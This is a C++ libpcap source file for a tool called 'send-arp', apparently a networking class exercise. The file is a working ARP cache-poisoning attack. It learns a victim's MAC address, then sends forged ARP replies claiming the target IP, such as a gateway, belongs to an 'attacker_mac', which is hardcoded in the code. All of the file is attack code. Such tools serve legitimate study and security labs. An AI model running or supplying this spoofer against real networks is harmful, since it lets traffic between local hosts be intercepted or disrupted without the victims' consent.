#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "ethhdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
// #include <net/if.h>
#include <arpa/inet.h>


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc <4||argc%2==1) {
		usage();
		return -1;
	}
	Mac attacker_mac;
	struct ifreq s;
	int fd1 = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

  strcpy(s.ifr_name, argv[1]);
  if (0 == ioctl(fd1, SIOCGIFHWADDR, &s)) {
    attacker_mac = Mac((uint8_t*)s.ifr_addr.sa_data);
  }
  	close(fd1);
	attacker_mac = Mac("E0:D4:E8:92:DB:82");

  int fd2;
 struct ifreq ifr;

 fd2 = socket(AF_INET, SOCK_DGRAM, 0);

 /* I want to get an IPv4 IP address */
 ifr.ifr_addr.sa_family = AF_INET;

 /* I want IP address attached to "eth0" */
 strncpy(ifr.ifr_name, argv[1], IFNAMSIZ-1);

 ioctl(fd2, SIOCGIFADDR, &ifr);
 //         inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr)

 close(fd2);

 for(int i=0;i<(argc-2)/2;i++){

 

 char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = attacker_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = attacker_mac;
	packet.arp_.sip_ = htonl(Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr)));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(argv[2+2*i]));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	Mac sender_mac;
	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		//printf("%u bytes captured\n", header->caplen);
		EthHdr* ether_pct = (EthHdr *)packet;
		if(ether_pct->type() != EthHdr::Arp) continue;
		ArpHdr* arp_pct = (ArpHdr*)((char*)ether_pct+14);
		if(arp_pct->op()!=ArpHdr::Reply||htonl(arp_pct->sip())!=htonl(Ip(argv[2+2*i]))) continue;
		sender_mac = arp_pct->smac();
		break;
	}


	packet.eth_.dmac_ = sender_mac;
	packet.eth_.smac_ = attacker_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = attacker_mac;
	packet.arp_.sip_ = htonl(Ip(argv[3+2*i]));
	packet.arp_.tmac_ = sender_mac;
	packet.arp_.tip_ = htonl(Ip(argv[2+2*i]));

	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
 }
}
